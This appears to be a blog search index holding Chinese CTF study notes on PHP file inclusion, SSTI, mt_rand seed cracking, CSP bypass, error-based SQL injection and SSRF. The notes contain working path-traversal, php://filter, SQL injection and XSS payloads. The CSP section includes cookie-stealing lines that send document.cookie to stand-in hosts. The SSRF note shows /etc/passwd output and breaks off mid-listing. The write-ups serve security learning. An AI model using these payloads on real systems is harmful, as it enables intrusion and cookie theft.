<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2018Xuca-Warmup之php文件包含问题]]></title>
    <url>%2F2018%2F12%2F06%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181204%EF%BC%89%EF%BC%9A2018Xuca-Warmup%E4%B9%8Bphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[2018Xuca一道web热身题，考点是文件包含，比较简单。下面是源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php","index"=&gt;"index.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it1"; return false; &#125; if (in_array($page, $whitelist)) &#123; //echo 'pass1'; return true; //情况一：输入的参数在给定的白名单里面，可以包含成功 &#125; $_page = mb_substr( //截取字符串 $page, 0, mb_strpos($page . '?', '?') ); //echo '&lt;br&gt;'.$_page.'&lt;br&gt;'; if (in_array($_page, $whitelist)) &#123; echo 'pass2'; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) //存在file参数 &amp;&amp; is_string($_REQUEST['file']) //是字符串 &amp;&amp; emmm::checkFile($_REQUEST['file']) //调用类方法检查 ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125;?&gt;分析主要是调用类方法对输入的参数进行检查，类方法判断了基本上是三种情况，满足其中一种返回为true都可以调用包含。情况1是输入的参数在白名单里，直接包含。情况2是多了个截取字符串，在输入内容后面加了问号，然后又截取问号前面的字符串（没想明白这样做有啥意义）这就给我们操作留了后门。我们可以这样构造12file=source.php?../../../../../../../etc/passwdfile=hint.php?../../../../../../..//etc/passwd斜杠分割的是一个目录，这里source.php?..整个会被认为是一个文件，但是在目录里这个文件并不存在，因此会继续触发后面的导致目录穿越所以类似这样的payload也是可以的：1file=%20source.php?dasdasdasd/../../../../../../etc/passwd涉及到的漏洞是：phpmyadmin4.8.1远程文件包含漏洞(CVE-2018-12613)情况3是对得到的参数解码（第二步截取后的），然后再截取。整体的思路就是第一段不出现?，第二段又要出现?。所以进行二次urlencode编码， %253f 浏览器会自动解码一次变成%3f，再经过代码的urldecode()变成?。接下来就是文件包含了。这里的文件包含和题目部署环境有关，Windows由于目录命名规则不能带?。所以只能使用这个方式。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
        <tag>Xuca</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181014）：模板注入（SSTI）]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181014%EF%BC%89%EF%BC%9A%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89%2F</url>
    <content type="text"><![CDATA[模板注入模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。静态模板文件会在运行时将变量/占位符替换为HTML页面中的实际值。当前流行且使用广泛的模板引擎有Smarty，Twig，Jinja2，FreeMarker，Velocity。服务器端模板注入（SSTI）漏洞将允许攻击者将注入模板指令作为用户输入，从而导致XSS或任意代码的执行（RCE)。利用方法：找到模板注入并识别模板引擎后的第一步是阅读文档。不应低估这一步骤的重要性; 其中一个日常利用的东西纯粹来自好学的文档细读。主要关注领域是：‘对于模板作者’部分涵盖基本语法。“安全注意事项” - 开发您正在测试的应用程序的人无法阅读此内容，并且可能包含一些有用的提示。内置方法，函数，过滤器和变量的列表。扩展/插件列表 - 默认情况下可以启用某些列表。参考文章：http://www.freebuf.com/vuls/83999.html实战剖析：https://www.codercto.com/a/Y3RvNjQwNWN0bw==.html探索Flask/Jinja2中的服务端模版注入 http://www.freebuf.com/articles/web/98619.html]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>模板注入</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181028）：php伪随机数和正则绕过（3rd上海赛web3）]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181028%EF%BC%89%EF%BC%9Aphp%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%92%8C%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%EF%BC%883rd%E4%B8%8A%E6%B5%B7%E8%B5%9Bweb3%EF%BC%89%2F</url>
    <content type="text"><![CDATA[首先通过php解密获得源代码，里面主要有以下文件：index.php12345678910111213141516171819202122232425262728&lt;?php$seed = rand(0,99999);mt_srand($seed);session_start();function auth_code($length = 12, $special = true)&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special) &#123; $chars .= '!@#$%^&amp;*()'; &#125; $password = ''; for ($i = 0; $i &lt; $length; $i++) &#123; $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125;$key = auth_code(16, false);echo "The key is :" . $key . "&lt;br&gt;";$private = auth_code(10, false);if(isset($_POST['private']))&#123; if($_POST['private'] === $_SESSION["pri"])&#123; header("Location:admin.php"); &#125;else&#123; $_SESSION["pri"] = $private; die("No private!"); &#125;&#125;?&gt;该界面完成的是用户登录验证功能。进入管理界面的条件是1$_POST['private'] === $_SESSION["pri"]$_SESSION[‘pri’]是怎么来的呢？由auth_code(10, false)函数定义。该函数主要实现的功能就是生成一定长度的随机数。关键函数用的是mt_srand和mt_rand函数简介：mt_srand()：播种 Mersenne Twister 随机数生成器。mt_rand()：使用 Mersenne Twister 算法返回随机整数。语法：mt_rand(min,max);例如：12345&lt;?phpmt_srand(mktime());echo(mt_rand());?&gt;输出：1132656473rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种子相同，产生的随机数将是相同的。伪随机数问题mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。123$seed = 12345;mt_rand($seed);$ss = mt_rand();linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 （工具：php_mt_seed。）在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。回到题目中，题目要求anth_code函数生成的16位随机字符串和第二次生成的10位随机字符串一致才会进入后台。根据上面函数漏洞，每个10位的随机数和16位的随机数是一一对应的（并不随机），因此写脚本爆破。12345678910111213141516171819202122&lt;?php$key_from_server=$_GET['id'];function auth_code($length = 12, $special = true)&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ($special) &#123; $chars .= '!@#$%^&amp;*()'; &#125; $password = ''; for ($i = 0; $i &lt; $length; $i++) &#123; $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $password;&#125;for ($i=0;$i&lt;=99999;$i++)&#123; mt_srand($i); $key = auth_code(16, false); if ($key_from_server==$key)&#123; echo auth_code(10, false); &#125;&#125;?&gt;结果类似：进入admin.phpadmin.php12345678910111213141516&lt;?phpif($_GET['authAdmin']!="***********")&#123; die("No login!");&#125;if(!isset($_POST['auth']))&#123; die("No Auth");&#125;else&#123; $auth = $_POST['auth']; $auth_code = "**********"; if(json_decode($auth) == $auth_code)&#123; ; &#125;else&#123; header("Location:index.php"); &#125;&#125;?&gt;主要目的是令json_decode($auth) == $auth_code可用弱类型绕过，auth=true进入file.phpfile.php123456789101112131415161718&lt;?phpif($_POST["auth"]=="***********")&#123; if(isset($_GET["id"]) &amp;&amp; (strpos($_GET["id"],'jpg') !== false)) &#123; $id = $_GET["id"]; preg_match("/^php:\/\/.*resource=([^|]*)/i", trim($id), $matches); if (isset($matches[1])) $id = $matches[1]; if (file_exists("./" . $id) == false) die("file not found"); $img_data = fopen($id,'rb'); $data = fread($img_data,filesize($id)); echo $data; &#125;else&#123; echo "file not found"; &#125;&#125;?&gt;首先GET提交id参数，且参数里必须有‘jpg’然后对提交的参数进行正则过滤1&quot;/^php:\/\/.*resource=([^|]*)/i&quot;改正则表达式的含义：php:// + 任意字符或空 + resource + 任意字符目的就是防止通过伪协议读取flag.php文件。语法含义^开头或取反.匹配除换行符 \n 之外的任何单字符*匹配前面的子表达式零次或多次()标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用[]标记一个中括号表达式的开始\指明两项之间的一个选择括号能提取字符串，如(com|cn|net)就可以限制，只能是com或cn或net。方括号是单个匹配，如[abc]他限制的不是abc连续出现，而是只能是其中一个，这样写那么规则就是找到这个位置时只能是a或是b或是c；大括号{}： 大括号的用法很简单，就是匹配次数，它需要和其他有意义的正则表达式一起使用。\^两个含义，只要是^这个字符是在中括号”[]”中被使用的话就是表示字符类的否定，如果不是的话就是表示限定开头。这里说的是直接在”[]”中使用，不包括嵌套使用。preg_match函数1preg_match ( $pattern , $subject , $matches )搜索subject与pattern给定的正则表达式的一个匹配.$matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。意思是$matches[1]匹配第一个括号里的匹配的内容如提交：1http://127.0.0.1/test.php?id=php://filter/read=convert.base64-encode/resource=test.php打印$matches变量：123array (size=2) 0 =&gt; string &apos;php://filter/read=convert.base64-encode/resource=test.php&apos; (length=57) 1 =&gt; string &apos;test.php&apos; (length=8)（正则看起来没啥用，伪协议主要是迎合正则表达式要求的格式，必须要匹配到，使$id有值，所以jpg的位置不重要）payload：1id=php://filter/jpgread=convert.base64-encode/resource=test.php]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>waf</tag>
        <tag>php</tag>
        <tag>上海赛</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181018）：CSP内容安全策略及绕过思路]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181018%EF%BC%89%EF%BC%9ACSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[CSP策略CSP指的是内容安全策略,作用是防xss攻击，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。可以在HTTP header上使用，也可以以在html meta标签上使用—推荐文章前端防御的开始： 从基本的防御xss思路开始，讲到csp防御策略及bypass思路，逻辑比较清晰，一步一步升级CSP学习笔记(持续学习更新) 有一些ctf案例我是如何绕过Uber的CSP防御成功XSS的？ 实战一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：1Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;unsafe-inline&apos;一、常用的策略指令：default-src 指令定义了那些没有被更精确指令指定的安全策略。 child-src 指定定义了 web workers 以及嵌套的浏览上下文（如&lt;frame&gt;和&lt;iframe&gt;）的源。 connect-src 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。 font-src 定义了字体加载的有效来源 img-src 定义了页面中图片和图标的有效来源 media-src object-src script-src 定义了页面中Javascript的有效来源 style-src 定义了页面中CSS样式的有效来源 sandbox 沙盒模式，会阻止弹窗js的执行 二、内容源：内容源有三种：源列表、关键字和数据1、源列表123456源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, &apos;*&apos;)，端口号也可以使用通配符 (同样是 &apos;*&apos;) 来表明所有合法端口都是有效来源。主机通过空格分隔。有效的主机表达式包括： http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。） mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。） https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。2、关键字123456‘none’代表空集；即不匹配任何 URL。两侧单引号是必须的。‘self’代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。‘unsafe-inline’允许使用内联资源3、数据1234data:允许data: URI作为内容来源。mediastream:允许mediastream: URI作为内容来源。12例：Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:4、配置示例123default-src &apos;self&apos;; //只允许同源下的资源script-src &apos;self&apos; www.google-analytics.com ajax.googleapis.com; //允许同源以及两个地址下的js加载default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;//多个资源时,后面的会覆盖前面的三、CSP绕过方式1、default-src ‘none’ ———-&gt; url跳转在default-src ‘none’的情况下，可以使用meta标签实现跳转1&lt;meta http-equiv="refresh" content="1;url=http://www.xss.com/x.php?c=[cookie]" &gt;2、script-src ‘self’ ‘unsafe-inline’ ———-&gt; 内联脚本在允许unsafe-inline的情况下，意味着可以执行脚本，但是要跨过可信域的限制，可以有以下几种方法：1、可以用window.location，或者window.open之类的方法进行跳转绕过。123&lt;script&gt;location.href=http://lorexxar.cn?a+document.cookie&lt;/script&gt;&lt;script&gt;windows.open(http://lorexxar.cn?a=+document.cooke)&lt;/script&gt;&lt;meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]"&gt;原因其实也很简单,大部分的网站跳转都还是要依赖前端进行的,所以无法对location.href做出限制因此还可以衍生出非常多的绕过方式比如动态创建元素,再引发页面跳转123var a=document.createElement("a");a.href='http://www.xss.com/?c='+escape(document.cookie);a.click();2、 js生成link prefetch（chrome）1234var n0t = document.createElement("link");n0t.setAttribute("rel", "prefetch");n0t.setAttribute("href", "//ssssss.com/?" + document.cookie);document.head.appendChild(n0t);3、script-src ‘nonce-{random-str}’有些网站限制只有某些脚本才能使用，往往会使用\&lt;script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：12345678910Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-&#123;random-str&#125;&apos;nonce属性（Number used once）nonce的意思是仅一次有效的随机字符串，要求每次请求时，该参数要保证不同，其目的是防止重放攻击nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;页面内嵌脚本，必须有这个token才能执行。&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt; // some code &lt;/script&gt;针对这种设置，一种思路是通过浏览器缓存来bypass https://lorexxar.cn/2017/05/16/nonce-bypass-script/另外一种针对script的最普通最常见的CSP规则，只允许加载当前域的js。1header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;);站内总会有上传图片的地方，如果我们上传一个内容为js的图片，图片就在网站的当前域下了。直接加载上传的js4、script-src http://127.0.0.1/a/ ————-&gt; 摆脱目录限制很明显的,如果我们的script-src设置为某个目录,通过这个目录下的302跳转,是可以绕过csp读取到另一个目录下的脚本的。在我的例子是这样设置的1Content-Security-Policy: default-src &apos;self&apos;;script-src http://127.0.0.1/a/ ;csp限制了/a/目录,而我们的目标脚本在/b/目录下则如果这时候请求redirect页面去访问/b/下的脚本是可以通过csp的检查的,比如1&lt;script src="http://127.0.0.1/a/redirect.php?url=/b/2" &gt;&lt;/script&gt;但是就如官网中描述的,加载的资源所在的域必须和自身处于同域下(example.com)也就是不可能通过302跳转去加载一个其他域下的脚本的。比如通过a.com的302跳转去加载b.com下的脚本所以这种方法仍然有一定的局限性,但是对于那些限制死了只能加载某个目录下的js的情况仍然有比较好的绕过效果ps：http://bobao.360.cn/learning/detail/3245.html 5、标签漏洞CSP除了阻止不可信js的解析以外，还有一个功能是组织向不可信域的请求。在该CSP规则下（script-src ‘self’），如果我们尝试加载外域的图片，就会被阻止。在CSP1.0中，对于link的限制并不完整，不同浏览器包括chrome和firefox对CSP的支持都不完整CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie1&lt;link rel="prefetch" href="http://www.xss.com/x.php?c=[cookie]"&gt; (H5预加载)在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie1&lt;link rel="dns-prefetch" href="//[cookie].xxx.ceye.io"&gt;（DNS预加载）6、标签漏洞由于大部分网站需要用到图片外链,因此其img-src往往设置为img-src *123var i=document.createElement("img");i.src='http://www.xss.com/?c='+escape(document.cookie);xxx.appendChild(i);这样就轻而易举的把cookie传输出去了。7、构造既定标签解析字符串如下面js：123// &lt;input id="cmd" value="alert,safe string"&gt;var array = document.getElementById('cmd').value.split(',');window[array[0]].apply(this, array.slice(1));从既定的标签中解析字符串当作js执行。8、CSP克星—jsonpJsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。jsonp原理详解关于json及jsonp攻击内容比较多，再另行更新笔记。0、注意点script-src和object-src是必设的，除非设置了default-src。因为攻击者只要能注入脚本，其他限制都可以规避。而object-src必设是因为 Flash 里面可以执行外部脚本。script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。工具CSP-Bypass – BurpSuite CSP绕过检测插件https://github.com/moloch–/CSP-Bypass]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>web</tag>
        <tag>CSP</tag>
        <tag>waf</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20180820）：sql之exp（updatexml）盲注突破黑名单过滤]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820180820%EF%BC%89%EF%BC%9Asql%E4%B9%8Bexp%EF%BC%88updatexml%EF%BC%89%E7%9B%B2%E6%B3%A8%E7%AA%81%E7%A0%B4%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%2F</url>
    <content type="text"><![CDATA[题目来源题目链接题目给的是一个一个登陆界面，源代码提示了数据库查询语句：1$sql="select * from users where username='$username' and password='$password'";开始以为登陆上去就行了，于是尝试万能密码、sqlmap post登录框等等，发现有关键字识别。比如分号、等号、井号等等。经过多次尝试，发现一个可以利用的payload1username=admin&amp;password=' or 'bw' BETWEEN 'aw' AND 'cw%00但是登陆进去后并没有想象中的flag，只是告诉你成功进来了。再结合这道题的名字：报错注入，推测应该是盲注。盲注的一般套路在这里不行，因为他把ascii、substring、substr、mid甚至limit都过滤了。放弃常规思路。后来查到利用exp溢出缺陷注入，具体payload如下：11' or exp(~(select * from(select (database())a)) and 'bw' BETWEEN 'aw' AND 'cw%00这句话可以直接查询到数据库名，为 error_based_hpf.（exp原理看链接）需要注意的是，这个payload后面一定要跟 and ‘bw’ BETWEEN ‘aw’ AND ‘cw%00，原因是原来的查询语句后面有个分号，只用exp的话无法闭合整条语句。查到数据库之后就是爆破表名，开始的时候用的是这个：1username=admin&amp;password=1' or exp(~(select * from(select table_name from information_schema.tables where table_schema REGEXP 'error_based_hpf')a)) and 'bw' BETWEEN 'aw' AND 'cw%00但是提示说查询结果超出一行，无法显示，考虑用limit。但是limit被过滤，利用limit一位一位暴不行，换思路。exp爆破有这样一个方法：1select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema regexp 'error_based_hpf' and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x可以将整个数据库的结构爆出来，包括表名和字段，但是悲剧的是里面必须有等号，这个payload里为啥有@:=这个组合还没搞明白，但是没了就不行，用别的替换也不行。（like也被过滤）再换思路百度的时候发现一种方式正则注入，通过regexp实现（之前测试的时候的它代替等号），于是有以下payload：1select * from user where username='admin' and 'passwd'=1 or exp(~(select * from(select 1 from information_schema.tables where table_schema regexp 'error_based_hpf' and table_name regexp '^a[a-z]')a)) and 'bw' BETWEEN 'aw' AND 'cw'这个和limit类似，也是一位一位的爆破，每次payload改变的地方在就在 ‘^a[a-z]’ 这里，首先猜解第一位，从a到z不断增加，再到数字，知道页面变化不同。第二位就是在第一位出来的基础上再从a开始猜解，以此类推。但是还有个小问题，正则表达式中短杠被过滤了（o(╥﹏╥)o），真是日了狗。换一下：1234username=admin&amp;password=1' or exp(~(select * from(select 1 frominformation_schema.tables where table_schema regexp 'error_based_hpf' andtable_name regexp '^fa[a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z|_|0|1|2|3|4|5|6|7|8|9]')a))and 'bw' BETWEEN 'aw' AND 'cw%00这种方法得到两个数据表：ffll44jj，user。然后构造爆破字段的payload：123456username=admin&amp;password=1' orexp(~(select * from(select 1 from information_schema.columns where table_name regexp 'ffll44jj'andcolumn_name regexp '^a[a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z|_|0|1|2|3|4|5|6|7|8|9]')a))and 'bw' BETWEEN 'aw' AND 'cw%00这个在本地测试是通过的，但是、、、、、服务器又TM报错了1Got error 28 from storage engine查了一下说是与服务器缓存不足有关。艹，上个题也是这样，快拿到flag了出现这个错误，但是我感觉payload没问题呀，wc下面是爆破表名的脚本，爆破字段的话那个payload还不行（日狗），下次通过了再更新、、、123456789101112131415161718192021222324252627282930313233343536373839# -*- coding: utf-8 -*-import requestsurl = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'char = 'abcdefghijklmnopqrstuvwxyz1234567890_'char = list(char)def post_url(payload): username = "admin" #数据表爆破 password = "1' or exp(~(select * from(select 1 from information_schema.tables where table_schema regexp 'error_based_hpf' and table_name regexp '^"+payload+"[a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z|_|0|1|2|3|4|5|6|7|8|9]')a)) and 'bw' BETWEEN 'aw' AND 'cw%00" #列字段爆破 data = &#123;'username':username,'password':password&#125; r = requests.post(url,data=data) if("select '1' from dual" in r.content): return payload # else: # print '[*]wrong:'+payloaddef get_flag(ex): if(ex==0): for i in char: if(post_url(i)): print i get_flag(i) else: for i in char: if(post_url(ex+i)): print ex+i get_flag(ex+i)get_flag(0)PS：后来我用别人的wp还是报那个错，应该是服务器问题了大佬的payload12获取表名字username=&amp;password=' or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp database())a)) or '12获取字段名username=&amp;password=' or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a)) or '12获取flagusername=&amp;password=' or exp(~(select * from(select value from ffll44jj)a)) or '另一个思路是在username字段进行利用updatexml报错函数进行http分割注入12345username=1′ and updatexml/*&amp;password=*/(1,concat(0x24,(select database()),0x24),1) and ‘1这个构造语句把中间的password参数给注释掉了，形成了完整的updatexml报错函数在=号被过滤的情况下，可以用 regexp database()或者regexp ‘ffll44jj’，in (6572726f725f62617365645f687066)，!(table_schema&lt;&gt;database())或者 !(table_schema&lt;&gt;’error_based_hpf’)PS：补充一下 updatexml 报错注入updatexml报的错是Xpath格式错误：1ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’为什么报这个错呢，这就要从updatexml函数说起：1UPDATEXML (XML_document, XPath_string, new_value);函数有三个参数，第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变XML_document中符合XPATH_string的值如果我们构造如下语句：1http://www.hack.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。updatexml注入一条龙回到题目我们用的payload如下：1username=1' and updatexml/*&amp;password=*/(1,concat(0x24,(select database()),0x24),1) and '1这里首先解释一下注释的问题，首先题目要求必须post username和password参数，不从数据库语法上看，这两个参数是存在的（url不会把password当成注释），但是带到数据库里执行是，password被注释了，因此构成updatexml注入。获取flag的payload如下：1username=' or updatexml/*&amp;password=123*/(1,concat(0x7e,(select * from (select * from ffll44jj)c),0x7e),1) or ']]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>WAF</tag>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181016）：从SSRF到Perl脚本漏洞]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181016%EF%BC%89%EF%BC%9A%E4%BB%8ESSRF%E5%88%B0Perl%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%EF%BC%88HITCON2017%EF%BC%89%2F</url>
    <content type="text"><![CDATA[题目链接ssrf给了一个脚本：123456789101112&lt;?php $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec("GET " . escapeshellarg($_GET["url"])); $info = pathinfo($_GET["filename"]); $dir = str_replace(".", "", basename($info["dirname"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info["basename"]), $data); highlight_file(__FILE__);首先创建一个沙盒文件夹，然后在这个文件夹环境下执行命令：GET+参数主要接受两个参数，一个是url（上面get的参数），另一个是filename。具体过程是通过GET命令获得url界面的内容（如果是网页或php，则是解析后的），然后将获得内容写到提供的filename里面。filename是一个目录加文件名的形式，如/123/111.php：12$info:array(4) &#123; [&quot;dirname&quot;]=&gt; string(4) &quot;/123&quot; [&quot;basename&quot;]=&gt; string(7) &quot;111.php&quot; [&quot;extension&quot;]=&gt; string(3) &quot;php&quot; [&quot;filename&quot;]=&gt; string(3) &quot;111&quot; &#125;dir---&gt;123如果是多级目录，如/var/www/html/123/111.php，由于 basename($info[“basename”]) ，$dir只会取最低目录，所以dir还是123：12$info:array(4) &#123; [&quot;dirname&quot;]=&gt; string(17) &quot;/var/www/html/123&quot; [&quot;basename&quot;]=&gt; string(7) &quot;111.php&quot; [&quot;extension&quot;]=&gt; string(3) &quot;php&quot; [&quot;filename&quot;]=&gt; string(3) &quot;111&quot; &#125;dir---&gt;123本来是可以通过在远程服务器写一个文本，文本里是小马，然后通过GET远程将小马内容写到目标服务器上。但是写进去之后php并不会被解析，原因是sandbox目录。在这个沙箱目录里，php不会被解析。于是自然想到逃逸出这个目录。在创建$dir目录时，这个参数是我们可以控制的，于是想到构造这样的filename—&gt;../../123/111.php。但是str_replace函数对点进行了过滤，无法返回上级目录。换一种姿势之前测试用的payload是这个格式的（本地环境搭建的）http://172.20.10.4/ssrf.php?filename=/123/111.php&amp;url=xxxx发现url可以读取本地目录，比如url=/etc/passwd(没啥东西)123456789101112131415161718192021222324root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falseorange:x:1000:1000::/home/orange:/bin/bash读取根目录，首先在kali里面试了1GET ~可以得到本地根目录内容。但是php脚本中，escapeshellarg() 函数自动将传入的参数加上了引号，变成了1GET `~` //返回400 URL must be absolute=换个姿势：1url=file:/成功123456789101112131415161718192021222324252627282930313233343536&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Directory /&lt;/TITLE&gt;&lt;BASE HREF="file:/"&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Directory listing of /&lt;/H1&gt;&lt;UL&gt;&lt;LI&gt;&lt;A 